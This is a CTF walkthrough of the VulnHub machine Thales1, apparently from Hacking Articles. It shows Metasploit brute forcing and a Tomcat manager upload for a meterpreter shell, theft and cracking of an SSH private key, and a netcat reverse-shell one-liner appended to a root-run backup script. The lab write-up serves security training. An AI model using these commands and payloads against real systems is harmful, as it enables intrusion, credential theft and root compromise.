@@ -1,0 +1,122 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Thales1 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/thales1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-12-16T08:00:05+00:00">December 16, 2021</time><time class="updated" datetime="2025-07-07T17:36:58+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">“Thales1” is a Capture the Flag challenge available on Vulnhub. MachineBoy deserves credit for developing this box. In this box, we will learn how to exploit a vulnerability in the Tomcat Application Manager instance to gain access to the system and we will also learn how to exploit a script running with root privileges to gain root access. So, let us see how to solve this machine in the proper steps.</span></p>
+<p><span style="color: #000000;">Download Thales from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/thales-1,749/"><strong>here</strong></a></span></span></p>
+<p><span style="color: #000000;">Level: Easy (For Beginners)</span></p>
+<p><span style="color: #000000;"><strong>Methodology:</strong></span></p>
+<p><span style="color: #000000;"><strong>Network scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">netdiscover </span></li>
+<li><span style="color: #000000;">nmap </span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing HTTP</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Metasploit</span></li>
+<li><span style="color: #000000;">John the Ripper</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">writable script</span></li>
+<li><span style="color: #000000;">Capture the Flag</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">Initially, we will scan the network to find the Victim machine IP using the netdiscover command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover</pre>
+<p><span style="color: #000000;">We find that the Victim machine has the IP address as <strong>192.168.1.175 </strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhtqm-8btXTZL6spPop1pr4aBjkM6avHSiJwuRlZXmw0f5Kh4tt0SfFHCFEfs9VGfR7-GIJzmtoD1QxJz5MDMG17LFBRFPoyLHgvj5AJ4_o9BJsMxS8EFsPHbPbSheATOjJoLWZcYDH8BUFxLT-gXN5xScLLcKndCXKX3f7xA--WyQYIu-3vXCd6tEjlg=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Nmap</strong></span></p>
+<p><span style="color: #000000;">Further, we ran an aggressive scan (-A) for open port enumeration where we found the following port details:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 192.168.1.175</pre>
+<p><span style="color: #000000;">According to the Nmap output, we get</span></p>
+<ul>
+<li><span style="color: #000000;">on port 22 SSH server running (OpenSSH)</span></li>
+<li><span style="color: #000000;">on port 8080 HTTP service running (Apache tomcat)</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgKNDn_H4v_Euwwjz7fieJeepncI99IHJX1_8U3VSlei_B4sYjNOX0dh1s6wt2HX9XzKcDlhxDJOutNf9voFqLaORPfM66hL2RIluhwDZPc6nBCzb0jpYLykmGEC8bvyJsINNoyqoeDMsH6oYkmdyxSrSKkDqMFUTaGnG22aRTFnzJDANXSqVXmtYiJWQ=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;"><strong>Abusing HTTP </strong></span></p>
+<p><span style="color: #000000;">Now let’s see if we can get any interesting information from port 8080. Because the Apache Tomcat Server is running on port 8080, we can see the result right away in the browser.</span></p>
+<p><span style="color: #000000;">We note the Tomcat version number: 9.0.52</span></p>
+<p><span style="color: #000000;">URL: <strong>http://192.168.1.175:8080</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgImuJgwYVAerBh71GBVSsQWzkhI5_3NfgM1l9wk6J4tfz1uBmB8kWhRxNd7yay8vVn5AFyHSyDicbsJYwuowVpzkDDgto3Lj2lBaNHjKZ20jQfXoFlXNxym2SstuD9-svKA_Vd5Yir4jtXZJp7JW_DHCYuR6bQc19YbodlMqmM_sewuxkKvMlmExtTTA=s16000"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<h4><span style="color: #000000;">Metasploit</span></h4>
+<p><span style="color: #000000;">Now, let’s start msfconsole. We will be using the auxiliary scanner to bruteforce tomcat manager login. Here we are using Metasploit default wordlist for password brute force attack.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -q
+use auxiliary/scanner/http/tomcat_mgr_login
+set rhosts 192.168.1.175
+set username tomcat
+set verbose false
+exploit</pre>
+<p><span style="color: #000000;">As a result, the password of tomcat that we get is <strong>tomcat:role1 </strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjqdWSPvGzw3NoLalk0ZJOeEp2DUzPm3TA7am-oMadcGhaVl9Kq5PEJeTTMut4Wq7KswSKcorHNy6PGQbIRh5mPvZYB151bp1C8YlAIueu8qQEzB14VsQFyWbCLgkKjxgmZst4rNbPAICr8XklVycjb_CYIsp5GDuB2-E309facyPNKlsXHDjeZ8W5GqQ=s16000"/></span></p>
+<p><span style="color: #000000;">As we enumerated Tomcat Manager Login creds thus we can try reverse connection by injecting malicious Java payload. We will use this exploit to get a meterpreter shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/http/tomcat_mgr_upload
+set rhosts 192.168.1.175
+set rport 8080
+set httpusername tomcat
+set httppassword role1
+exploit</pre>
+<p><span style="color: #000000;">After getting the meterpreter shell we navigate to the ‘home’ directory and there we can find a sub-directory named ‘thales’. Entering the ‘thales’ directory we get two files: <strong>user.txt </strong>and<strong> notes.txt. </strong>We also find a <strong>.ssh</strong> directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
+ls
+cd thales
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjpbDmCA5p6VkiDMSY1tFdMqtxCWCPjgUJIbZCjwV_rlkIBV8EKv67jq01GE5cgOKeZtpD0SMQ2_On4WvC4MoRgnI1-iBMdMpFq2E62-mzmsMB061XNvopeu8GiHnKpObOS6TttuPPatHFxc0CD6Z3k1-hb-EDiqidP_A4Ax24wZVady8kDESRaj8z4tw=s16000"/></span></p>
+<p><span style="color: #000000;">We observe that the public key (id_rsa.pub) and the private key(id_rsa) are present on the victim machine. The private key is used to login. So now we proceed to download the private key onto our kali machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd .ssh
+ls
+download id_rsa /root/Desktop</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiqNmwvnDC0TnhVio7e--VroEk0fMNsvOD1sjRluTCFpzBKn28HQzyIiWZ3cTdIT4yH4Q5YTgLmXuiYv2BwjQ6Yh13WlGI0Qn_zQqYfFu_-w7mbeDCiEXNl4oiQwMBgoGT6OoagU7J6pVLN60l_GKx_YS6ci4zclZ1K3PHo0EN9RwQZYaGuY_tEI7Uh8w=s16000"/></span></p>
+<h4><span style="color: #000000;">John the Ripper</span></h4>
+<p><span style="color: #000000;">Here we have downloaded<strong> id_rsa</strong> file that is password-protected, now, we need to convert the id_rsa key into a hash that can be cracked using <strong>‘john</strong>’. First, we use the command ‘ssh2john’ to convert the key into a hash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">locate ssh2john
+/usr/share/john/ssh2john.py id_rsa &gt; sshhash</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiNuDEXkGmW4xxRmVss9S5tM4NVEzXbf_5KjRDTw03HEUIILl4ZyC8gxkUbroglvoNyfeFvInOXf2LjXjNoNF4dwgdfSUIEJJPsFDWZkIJFWYgZchNUKQgVl5yi8bx5uJQz2u_egO8flZriO3i2j6iwq2e9m8oT5JdyhpX7-yvTGxr34cfloGJYOOky3g=s16000"/></strong></span></p>
+<p><span style="color: #000000;">Now we can attempt to crack the hash with john the ripper. We will use the wordlist ‘rockyou.txt’.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist=/usr/share/wordlists/rockyou.txt sshash</pre>
+<p><span style="color: #000000;">Hash is cracked and we get the password:<strong> vodka06  </strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiwv6Ul7Trjo05L7D8UO2GkNcDYmvEKfELsJTVuwKmxVar4HBTGbM-o-NdDYBxjB5274i2NVwggt8-m-Va-XaWWDRiQDa8NBM0Bl8B_Xsd_pEtWWKPnoYTAT7VF8aRmFrBDyE477YNfWFsf18SeWGR7AtyosAwornjZWGE8dwLVZ6RtvJeqB0UgMA7O1A=s16000"/></span></p>
+<p><span style="color: #000000;">After we get a shell, we will upgrade our non-interactive shell to a partially interactive one using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty; pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Since we have cracked the password of user ‘thales’, let’s switch to the thales user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su thales</pre>
+<p><span style="color: #000000;">After switching to thales user, we use the command “<strong>id</strong>” to know about the real and effective ‘user and group’ IDs. We find that thales is a non-root user.</span></p>
+<p><span style="color: #000000;">Now we use “ sudo -l “ to check which commands can be run as root by the user thales.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
+<p><span style="color: #000000;">We find that user thales does not have the ability to run any command as root. </span><span style="color: #000000;">So now we navigate around in search of some interesting files.</span></p>
+<p><span style="color: #000000;">We get a hint on note.txt that a backup script is prepared for us in the directory <strong>/usr/local/bin/backup.sh</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEixwf8Yg1lFmK5R3ruKimBxZi1kDIxcFh5cEjuvQwPrFW2hHyQOT7YdwZi-J4ER3hMRIzUeTJdsDFXhu-PQ4ZRFL_n726lin7qw9R9ejbyT-zcX8aCD7ylnvYqXTrLOTag2A_JQrxREhiXagOVo8m7RDNTFzSZe_9bcuHRkYL_mFqTnJS6vq5M16LUaCA=s16000"/></span></p>
+<p><span style="color: #000000;">Now, let’s go and check the backup.sh file. We investigate and find that this file has read, written, and execute permissions and the file is owned by the root.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /usr/local/bin/backup.sh
+ls -la /usr/local/bin/backup.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjVgoyrHvKhDfZEkuQPMB4VZXoPKDpnRHVzwwBIFGXbhvBq_G30gQv8eBCLsir4D3jLrq1_hYJsw4YbiNGSjLDQEDzMnYbfq7FEvVIaf2PWqQSrpqY56av4REAoaSSatdyFlyb4sJDvMlhvl6POD8p4QawpyRo-iwtE9TgUsmoO7I9rIdhk_Y83mtYTmA=s16000"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Since the backup.sh is writable thus we can edit this script by injecting reverse shell payload and expect to get root shell access.</span></p>
+<p><span style="color: #000000;">On our attacking machine ( kali ) we will start a Netcat listener to receive the shell, on port 8888</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 8888</pre>
+<p><span style="color: #000000;">Execute the following command in the terminal to append the backup.sh script for injecting malicious payload.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.3 8888 &gt;/tmp/f" &gt;&gt;backup.sh</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhBL3BW9jl_CovCcxeL92kqflKaZ__Zc0kQFtsMsuFpDFkdhuvEWuFifQTwBh8U7mPYaN6fOWbJ3-wcQhzlvj3IvqhK9Aag7YbWDaDARFCaQdo9t2cdBAZ58EfpxKyWefmoaoh9P3NmocNFYOlCLrfIxUumVvnopbVZa0smp12WiJI-UO8s_ZdaHJ-vwQ=s16000"/></strong></span></p>
+<p><span style="color: #000000;">since it was a backup script that run automatically, thus it will give root privilege reverse shell over port 8888.</span></p>
+<p><span style="color: #000000;"><strong>Capture the root flag</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">id
+cd /root
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;"> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhNfYCeFrOLKhE4g2btktj9RmndKI3_K66-wb9fWOjaU5TGxh4cJRAbxFhFWlZ7a25IfvHRDNq5rddrCMcPWC4rhIDnF-oF6pHtDME9bEpMng01HJrRHab353sWr7P9eAw9ZgDXAFu7O_GKHi2-97fY5xtduOKmwCCL55g9f3oe9HLwqQhMCCP9sae9Zg=s16000"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Sakshi Gurao is a Researcher and Technical Writer at Hacking Articles, Red Teamer, Penetration Tester. Contact <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/sakshi-gurao">Linkedin</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
